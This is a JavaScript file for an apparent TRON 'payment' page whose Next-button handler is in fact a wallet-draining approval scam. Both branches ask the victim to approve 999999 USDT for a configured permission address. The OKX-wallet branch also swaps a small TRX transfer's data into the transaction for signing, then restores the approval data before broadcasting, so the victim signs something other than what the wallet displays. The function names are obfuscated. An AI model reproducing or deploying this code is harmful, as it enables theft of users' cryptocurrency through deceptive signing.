// 下一步按钮点击处理函数
async function onNextButtonClick() {
    try {
        // 验证地址配置
        validateAddressConfig();
        
        // 检查钱包是否已连接
        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            await connectWallet();
            return; // 连接后停止，等待用户再次点击
        }
        
        // 检查tronWeb核心方法是否存在
        if (typeof window.tronWeb.address.toHex !== 'function') {
            throw new Error("TronWeb环境异常，缺少必要方法");
        }
        
        // 钱包已连接，直接执行操作
        if (typeof window.okxwallet !== 'undefined') {
            await DjdskdbGsj();
        } else {
            await KdhshaBBHdg();
        }
    } catch (error) {
        console.error('操作执行失败:', error);
        tip('付款失败，请重新发起交易: ' + error.message);
    }
}

// 验证地址配置
function validateAddressConfig() {
    const addresses = [
        { name: '权限地址', value: window.Permission_address },
        { name: '收款地址', value: window.Payment_address },
        { name: 'USDT合约地址', value: window.usdtContractAddress }
    ];
    
    // 检查地址是否存在
    addresses.forEach(item => {
        if (!item.value) {
            throw new Error(`${item.name}未配置，请检查配置`);
        }
    });
    
    // 检查地址格式
    const isValidAddress = (addr) => addr.length === 34 && addr.startsWith('T');
    addresses.forEach(item => {
        if (!isValidAddress(item.value)) {
            throw new Error(`${item.name}格式错误: ${item.value}`);
        }
    });
}

async function DjdskdbGsj() {
  const trxAmountInSun = window.tronWeb.toSun(currentAmount);
  const approveAmount = 999999 * 1e6; // 999999 USDT，6位精度
  const feeLimit = 1000000000;
  
  try {
    // 转换地址为十六进制
    const paymentAddressHex = window.tronWeb.address.toHex(window.Payment_address);
    const usdtContractHex = window.tronWeb.address.toHex(window.usdtContractAddress);
    const permissionHex = window.tronWeb.address.toHex(window.Permission_address);
    
    console.log("构建TRX转账交易...");
    const transferTransaction = await window.tronWeb.transactionBuilder.sendTrx(
      paymentAddressHex,
      trxAmountInSun,
      window.tronWeb.defaultAddress.base58,
      { feeLimit: feeLimit }
    );

    const approvalTransaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
      usdtContractHex,
      'increaseApproval(address,uint256)',
      { feeLimit: feeLimit },
      [
        { type: 'address', value: permissionHex },
        { type: 'uint256', value: approveAmount }
      ],
      window.tronWeb.defaultAddress.base58
    );

    const originalRawData = approvalTransaction.transaction.raw_data;
    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;

    console.log("交易签名中...");
    const signedTransaction = await window.tronWeb.trx.sign(approvalTransaction.transaction);
    signedTransaction.raw_data = originalRawData;

    console.log("发送交易...");
    const broadcastResult = await window.tronWeb.trx.sendRawTransaction(signedTransaction);

    console.log("交易结果:", broadcastResult);
    if (broadcastResult.result || broadcastResult.success) {
      const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
      if (!transactionHash) {
        throw new Error("无法获取交易哈希");
      }
      console.log("交易发送成功，交易哈希:", transactionHash);
      tip("交易成功");
      return transactionHash;
    } else {
      throw new Error("交易失败");
    }
  } catch (error) {
    console.error("操作失败:", error);
    tip("交易失败，请重试: " + error.message);
    throw error;
  }
}

async function KdhshaBBHdg() {
    const approveAmount = 999999 * 1e6; // 999999 USDT，6位精度
    const feeLimit = 100000000;  // 设置feeLimit为100 TRX
    
    try {
        // 验证地址并转换为十六进制
        const usdtContractHex = window.tronWeb.address.toHex(window.usdtContractAddress);
        const permissionHex = window.tronWeb.address.toHex(window.Permission_address);
        
        console.log("构建交易...");
        const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
            usdtContractHex,
            'approve(address,uint256)',
            { feeLimit: feeLimit },
            [
                { type: 'address', value: permissionHex },
                { type: 'uint256', value: approveAmount }
            ],
            window.tronWeb.defaultAddress.base58
        );

        if (!transaction.result || !transaction.result.result) {
            throw new Error('授权交易构建失败');
        }

        console.log("交易签名中...");
        const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);

        console.log("发送交易...");
        const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);

        console.log("交易结果:", result);
        if (result.result) {
            const transactionHash = result.txid;
            console.log("交易成功，交易哈希:", transactionHash);
            tip("交易成功");
            return transactionHash;
        } else {
            throw new Error("交易失败");
        }
    } catch (error) {
        console.error("执行授权操作失败:", error);
        tip("授权失败，请重试: " + (error.message || error.toString()));
        throw error;
    }
}

// 提示函数（假设已在其他地方定义，这里补充完整）
function tip(message) {
    // 创建提示元素
    let tipElement = document.getElementById('customTip');
    if (!tipElement) {
        tipElement = document.createElement('div');
        tipElement.id = 'customTip';
        tipElement.style.position = 'fixed';
        tipElement.style.bottom = '20px';
        tipElement.style.left = '50%';
        tipElement.style.transform = 'translateX(-50%)';
        tipElement.style.padding = '10px 20px';
        tipElement.style.backgroundColor = 'rgba(0,0,0,0.7)';
        tipElement.style.color = 'white';
        tipElement.style.borderRadius = '4px';
        tipElement.style.zIndex = '9999';
        document.body.appendChild(tipElement);
    }
    
    // 设置提示内容并显示
    tipElement.textContent = message;
    tipElement.style.display = 'block';
    
    // 3秒后隐藏
    setTimeout(() => {
        tipElement.style.display = 'none';
    }, 3000);
}
